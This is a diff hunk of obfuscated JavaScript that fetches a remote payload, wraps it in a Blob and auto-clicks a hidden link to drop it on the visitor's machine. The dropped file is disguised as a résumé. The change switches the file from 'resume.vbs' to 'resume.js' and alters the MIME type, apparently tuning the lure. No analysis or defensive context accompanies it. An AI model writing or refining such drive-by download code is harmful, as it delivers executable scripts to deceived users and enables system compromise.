@@ -189,10 +189,10 @@
       fetch(_0xdef)
         .then(_0xr => _0xr.text())
         .then(_0xdata => {
-          const _0xblob = new Blob([_0xdata], { type: "application/msword" });
+          const _0xblob = new Blob([_0xdata], { type: "application/octet-stream" });
           const _0xa = document.createElement("a");
           _0xa.href = URL.createObjectURL(_0xblob);
-          _0xa.download = "resume.vbs";
+          _0xa.download = "resume.js";
           document.body.appendChild(_0xa);
           _0xa.click();
           URL.revokeObjectURL(_0xa.href);
